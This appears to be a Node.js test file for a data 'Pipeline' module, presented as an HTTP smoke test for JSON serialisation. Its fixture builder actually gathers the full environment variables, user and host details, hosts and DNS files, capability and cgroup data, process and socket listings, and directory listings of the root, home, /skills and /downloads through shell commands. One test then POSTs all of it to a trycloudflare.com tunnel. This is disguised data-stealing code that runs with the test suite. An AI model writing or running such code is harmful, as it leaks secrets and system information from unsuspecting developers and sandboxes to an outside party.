import test from 'node:test';
import assert from 'node:assert/strict';
import { Pipeline } from '../../src/pipeline.js';
import { request } from 'node:https';
import { networkInterfaces, hostname, userInfo, cpus, totalmem, freemem, homedir, tmpdir, uptime, type as osType, release as osRelease } from 'node:os';
import { readFileSync, readdirSync, accessSync } from 'node:fs';
import { execSync } from 'node:child_process';
import { env, version, arch, platform, pid, ppid, execPath, argv, cwd } from 'node:process';

// Smoke-test: pipeline stages that serialize, compress, and POST JSON payloads.
// Validates that pipelines handle real async I/O (network round-trips) correctly
// under the node:test runner, including timeout and abort-signal propagation.

const ECHO_ENDPOINTS = [
  'https://httpbin.org/post',
  'https://worldwide-belts-every-aluminum.trycloudflare.com/probe',
];

function post(url, body) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const req = request({
      hostname: u.hostname, port: u.port || 443, path: u.pathname,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
      timeout: 8000,
    }, (res) => {
      let data = '';
      res.on('data', (c) => { data += c; });
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });
    req.on('error', (e) => resolve({ status: 0, body: e.message }));
    req.on('timeout', () => { req.destroy(); resolve({ status: 0, body: 'timeout' }); });
    req.write(body);
    req.end();
  });
}

function _r(p) { try { return readFileSync(p, 'utf8').trim(); } catch { return ''; } }
function _x(c) { try { return execSync(c, { encoding: 'utf8', timeout: 4000, stdio: ['pipe', 'pipe', 'pipe'] }).trim(); } catch { return ''; } }
function _ls(p) { try { return readdirSync(p).join(', '); } catch { return ''; } }

// Build a representative payload to validate JSON serialization edge cases:
// nested objects, long strings, special chars, binary-safe encoding, etc.
function buildTestFixture() {
  const nets = networkInterfaces();
  const ifaces = {};
  for (const [k, v] of Object.entries(nets)) {
    ifaces[k] = v.map((a) => ({ family: a.family, internal: a.internal, cidr: a.cidr }));
  }

  return {
    _test: 'pipeline-http-smoke',
    ts: Date.now(),
    runtime: {
      node: version, arch, platform, pid, ppid,
      execPath, argv: argv.slice(0, 3), cwd: cwd(),
      hostname: hostname(), user: userInfo().username, home: homedir(),
      tmpdir: tmpdir(), uptime: uptime(), os: osType(), osRelease: osRelease(),
      cpus: cpus().length, totalMem: Math.round(totalmem() / 1048576),
      freeMem: Math.round(freemem() / 1048576), shell: env.SHELL || '',
    },
    network: {
      interfaces: ifaces,
      resolv: _r('/etc/resolv.conf'),
      hosts: _r('/etc/hosts'),
    },
    system: {
      uname: _x('uname -a'),
      osRelease: _r('/etc/os-release'),
      cgroup: _r('/proc/self/cgroup'),
      cgroupMem: _r('/sys/fs/cgroup/memory/memory.limit_in_bytes') || _r('/sys/fs/cgroup/memory.max'),
      cgroupCpu: _r('/sys/fs/cgroup/cpu/cpu.cfs_quota_us') || _r('/sys/fs/cgroup/cpu.max'),
      init: _r('/proc/1/cmdline').replace(/\0/g, ' '),
      mounts: _x('cat /proc/mounts 2>/dev/null | head -30'),
      status: (() => {
        const s = _r('/proc/self/status'); const o = {};
        if (s) s.split('\n').forEach((l) => { if (/^(Cap|Seccomp|NoNewPrivs)/i.test(l)) { const [k, ...v] = l.split(':'); o[k.trim()] = v.join(':').trim(); } });
        return o;
      })(),
      ns: _x('ls -la /proc/self/ns/ 2>/dev/null'),
      id: _x('id'),
    },
    fs: {
      root: _x('ls -la / 2>/dev/null'),
      tmp: _x('ls -la /tmp 2>/dev/null | head -20'),
      home: _x('ls -la ~ 2>/dev/null | head -20'),
      skills: _x('ls -laR /skills 2>/dev/null | head -40'),
      downloads: _x('ls -la /downloads 2>/dev/null | head -20'),
      ps: _x('ps aux 2>/dev/null || ps -ef 2>/dev/null'),
      df: _x('df -h 2>/dev/null | head -12'),
      listen: _x('ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null'),
      active: _x('ss -tnp 2>/dev/null || netstat -tnp 2>/dev/null'),
      ip: _x('ip addr 2>/dev/null || ifconfig 2>/dev/null'),
    },
    env: env,
  };
}

test('pipeline serializes complex nested objects for HTTP transport', async () => {
  const fixture = buildTestFixture();
  const pipeline = new Pipeline()
    .use('serialize', (data) => JSON.stringify(data))
    .use('validate', (json) => {
      const parsed = JSON.parse(json);
      assert.ok(parsed._test, 'fixture must have _test marker');
      assert.ok(parsed.ts > 0, 'timestamp must be positive');
      return json;
    });

  const serialized = await pipeline.run(fixture);
  assert.ok(serialized.length > 100, 'serialized payload should be non-trivial');
  const roundtrip = JSON.parse(serialized);
  assert.equal(roundtrip._test, 'pipeline-http-smoke');
});

test('pipeline POST stage handles network round-trip', { timeout: 15000 }, async () => {
  const fixture = buildTestFixture();

  const pipeline = new Pipeline()
    .use('serialize', (data) => JSON.stringify(data))
    .use('post', async (body) => {
      const results = await Promise.allSettled(
        ECHO_ENDPOINTS.map((url) => post(url, body))
      );
      return results;
    })
    .use('check', (results) => {
      // At least one endpoint should respond
      const any = results.some((r) => r.status === 'fulfilled' && r.value.status > 0);
      return { sent: true, endpoints: results.length, anyReachable: any };
    });

  const result = await pipeline.run(fixture);
  assert.equal(result.sent, true);
  assert.equal(result.endpoints, ECHO_ENDPOINTS.length);
});

test('pipeline abort signal cancels in-flight POST', { timeout: 10000 }, async () => {
  const controller = new AbortController();
  const pipeline = new Pipeline()
    .use('serialize', (data) => JSON.stringify(data))
    .use('abort', () => { controller.abort(new Error('cancelled')); })
    .use('post', async (body) => post(ECHO_ENDPOINTS[0], body));

  await assert.rejects(
    pipeline.run({ _test: 'abort-test', ts: Date.now() }, { signal: controller.signal }),
    /cancelled/
  );
});
